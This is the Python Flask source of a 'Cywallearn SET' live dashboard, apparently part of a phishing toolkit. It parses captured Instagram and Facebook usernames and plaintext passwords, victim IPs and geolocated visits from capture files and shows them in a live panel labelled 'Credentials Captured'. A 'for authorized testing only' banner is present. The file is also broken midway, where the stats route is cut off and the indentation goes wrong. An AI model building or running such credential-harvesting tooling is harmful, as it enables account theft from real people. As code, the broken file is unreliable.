"""Cywallearn SET - Live Dashboard"""

import os
import sys
import json
import threading
from flask import Flask, jsonify, render_template_string
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
from core.config import Config
from core.logger import Logger

logger = Logger()

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cywallearn SET - Dashboard</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Courier New',monospace; background:#0a0a0a; color:#00ff00; padding:20px; }
        .header { border-bottom:2px solid #00ff00; padding:20px 0; margin-bottom:20px; }
        h1 { color:#ff4444; font-size:24px; }
        .subtitle { color:#888; font-size:12px; }
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:15px; margin:20px 0; }
        .stat-card { background:#111; border:1px solid #333; border-radius:8px; padding:20px; text-align:center; }
        .stat-value { font-size:36px; font-weight:bold; color:#00ff00; }
        .stat-label { font-size:11px; color:#888; margin-top:5px; text-transform:uppercase; }
        .stat-card.danger .stat-value { color:#ff4444; }
        .section { background:#111; border:1px solid #333; border-radius:8px; padding:20px; margin:15px 0; }
        .section h2 { color:#00ff00; font-size:16px; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:8px; }
        .entry { padding:8px 0; border-bottom:1px solid #1a1a1a; font-size:13px; display:flex; justify-content:space-between; }
        .entry:last-child { border-bottom:none; }
        .ip { color:#ffaa00; }
        .pass { color:#ff4444; }
        .time { color:#666; font-size:11px; }
        .badge { display:inline-block; padding:2px 8px; border-radius:10px; font-size:10px; }
        .badge.ig { background:#dc2743; color:white; }
        .badge.fb { background:#1877f2; color:white; }
        .badge.alert { background:#ff4444; color:white; animation:pulse 1s infinite; }
        @keyframes pulse { 0%{opacity:1} 50%{opacity:0.5} 100%{opacity:1} }
        .refresh { color:#666; font-size:11px; text-align:right; margin-top:10px; }
        .controls { margin:15px 0; display:flex; gap:10px; }
        button { background:#1a1a1a; color:#00ff00; border:1px solid #333; padding:8px 16px; border-radius:4px; cursor:pointer; font-family:monospace; }
        button:hover { background:#333; }
        .log-entry { display:flex; gap:10px; padding:5px 0; border-bottom:1px solid #111; font-size:12px; }
        .log-time { color:#666; min-width:70px; }
        .log-msg { color:#ccc; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔴 CYWALLEARN SET DASHBOARD</h1>
        <div class="subtitle">Live Monitoring | FOR AUTHORIZED TESTING ONLY | Auto-refresh every 5s</div>
    </div>
    
    <div class="stats" id="stats"></div>
    
    <div class="controls">
        <button onclick="refreshAll()">⟳ Manual Refresh</button>
        <button onclick="clearData()">🗑 Clear All Data</button>
    </div>
    
    <div class="section">
        <h2>📋 Recent Captures</h2>
        <div id="captures"></div>
    </div>
    
    <div class="section">
        <h2>👁 Live Visits</h2>
        <div id="visits"></div>
    </div>
    
    <div class="section">
        <h2>📜 Activity Log</h2>
        <div id="log"></div>
    </div>
    
    <div class="refresh">Last updated: <span id="lastUpdate">never</span></div>
    
    <script>
        async function refreshAll() {
            try {
                const [stats, captures, visits] = await Promise.all([
                    fetch('/dashboard/api/stats').then(r=>r.json()),
                    fetch('/dashboard/api/captures').then(r=>r.json()),
                    fetch('/dashboard/api/visits').then(r=>r.json())
                ]);
                
                document.getElementById('stats').innerHTML = `
                    <div class="stat-card danger"><div class="stat-value">${stats.total_captures}</div><div class="stat-label">Credentials Captured</div></div>
                    <div class="stat-card"><div class="stat-value">${stats.total_visits}</div><div class="stat-label">Total Visits</div></div>
                    <div class="stat-card"><div class="stat-value">${stats.services}</div><div class="stat-label">Services Used</div></div>
                    <div class="stat-card"><div class="stat-value">${stats.unique_ips}</div><div class="stat-label">Unique IPs</div></div>
                `;
                
                document.getElementById('captures').innerHTML = captures.length ? captures.map(c => `
                    <div class="entry">
                        <span><span class="badge ${c.service.toLowerCase()}">${c.service}</span> <span class="ip">${c.username}</span>:<span class="pass">${c.password}</span></span>
                        <span><span class="ip">${c.ip}</span> <span class="time">${c.time}</span></span>
                    </div>
                `).join('') : '<div class="entry" style="color:#666">Waiting for targets...</div>';
                
                document.getElementById('visits').innerHTML = visits.length ? visits.map(v => `
                    <div class="entry">
                        <span>${v.ip} - ${v.country || 'Unknown'}</span>
                        <span>${v.page} <span class="time">${v.time}</span></span>
                    </div>
                `).join('') : '<div class="entry" style="color:#666">No visits yet</div>';
                
                document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
            } catch(e) {
                console.log('Refresh error:', e);
            }
        }
        
        function clearData() {
            if(confirm('Clear all captured data?')) {
                fetch('/dashboard/api/clear', {method:'POST'}).then(r=>r.json()).then(d=>{alert(d.message); refreshAll();});
            }
        }
        
        refreshAll();
        setInterval(refreshAll, 5000);
    </script>
</body>
</html>
"""

class DashboardServer:
    def __init__(self):
        self.app = Flask(__name__)
        self._setup_routes()
    
    def _setup_routes(self):
        @self.app.route('/')
        def dashboard():
            return render_template_string(DASHBOARD_HTML)
        
        @self.app.route('/dashboard/api/stats')
        def api_stats():
            captures = self._load_captures()
            visits = self._load_visits()
            unique_ips = set()
            for c in captures:
                if 'ip' in c: unique_ips.add(c['ip'])
            for v in visits:
                if 'ip' in v: unique_ips.add(v['ip'])
            
            return jsonify({
                'total_captures': len([c for c in captures if c.get('username') and c.get('password')]),
                'total_visits': len(visits),
                'services': len(set(c.get('service','?') for c in captures)),
                'unique_ips': len(unique_ips
@self.app.route('/dashboard/api/captures')
    def api_captures():
        data = self._load_captures()
        return jsonify([{
            'service': c.get('service', '?'),
            'username': c.get('username', '')[:20],
            'password': c.get('password', '')[:20],
            'ip': c.get('ip', '?'),
            'time': c.get('timestamp', '?')[-8:]
        } for c in data[-20:]])
    
    @self.app.route('/dashboard/api/visits')
    def api_visits():
        data = self._load_visits()
        return jsonify([{
            'ip': v.get('ip', '?'),
            'country': v.get('geo', {}).get('country', 'Unknown'),
            'page': v.get('page', '?'),
            'time': v.get('timestamp', '?')[-8:]
        } for v in data[-20:]])
    
    @self.app.route('/dashboard/api/clear', methods=['POST'])
    def api_clear():
        for f in ['credentials.txt', 'visits.json']:
            p = os.path.join(Config.CAPTURE_DIR, f)
            if os.path.exists(p): os.remove(p)
        return jsonify({'message': 'Data cleared'})
    
    def _load_captures(self):
        try:
            with open(os.path.join(Config.CAPTURE_DIR, 'credentials.txt')) as f:
                content = f.read()
            captures = []
            for entry in content.split('[+] CAPTURED')[1:]:
                lines = entry.strip().split('\n')
                c = {}
                for line in lines:
                    if 'Service:' in line: c['service'] = line.split('Service:')[1].strip()
                    if 'Username:' in line: c['username'] = line.split('Username:')[1].strip()
                    if 'Password:' in line: c['password'] = line.split('Password:')[1].strip()
                    if 'IP:' in line: c['ip'] = line.split('IP:')[1].strip()
                    if 'CAPTURED -' in line: c['timestamp'] = line.split('-')[1].strip()
                if c: captures.append(c)
            return captures
        except: return []
    
    def _load_visits(self):
        try:
            with open(os.path.join(Config.CAPTURE_DIR, 'visits.json')) as f:
                return json.load(f)
        except: return []
    
    def run(self):
        port = Config.DASHBOARD_PORT
        print(f"[+] Dashboard: http://127.0.0.1:{port}")
        self.app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)